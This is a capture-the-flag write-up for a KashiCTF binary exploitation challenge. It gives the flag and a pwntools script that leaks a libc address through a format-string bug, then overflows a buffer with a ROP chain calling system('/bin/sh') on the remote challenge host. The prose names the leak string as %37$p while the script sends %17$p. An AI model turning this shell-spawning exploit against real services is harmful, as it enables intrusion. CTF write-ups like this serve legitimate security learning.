---
title: "leap_of_faith"
category: Binary Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
flag: KashiCTF{did_some_trolling_right_there_vSVU9bzY}
---
> ROP ROP all the way

---

In the troll function there is format string vulnerability

Use it to get __libc_start_main + 133 address
Format string sent: %37$p

There is bof in main function

```py
from pwn import *

binary = './chall/vuln'
libc = ELF("./chall/libc.so.6")
ld = ELF("./chall/ld-linux-x86-64.so.2")

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
# r = process([ld.path, binary], env={"LD_PRELOAD": libc.path})
r = remote('kashictf.iitbhucybersec.in', 51612)

print(f'[*] {binary} base @ {hex(e.address)}')
print(f'[*] {libc.path} base @ {hex(libc.address)}')

r.recvuntil(b'What do you want? ')
r.send(f"%17$p")
r.send(b"\x0A")
r.recvuntil(b'Lmao not giving you ')
leak = int(r.recvline().strip(), 16)
print(f'[*] __libc_start_main_impl @ {hex(leak)}')

libc_base = leak - (0x7ffff7e0924a - 0x7ffff7de2000)
print(f'[*] libc base @ {hex(libc_base)}')

libc.address = libc_base

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

print(f'POP_RDI: {hex(POP_RDI)}')
print(f'RET: {hex(RET)}')

r.recvuntil(b'Wanna Cry about that? ')
r.sendline(flat([
    cyclic(32),
    cyclic(8),
    POP_RDI,
    binsh,
    p64(RET),
    system,
]))

r.interactive()
```
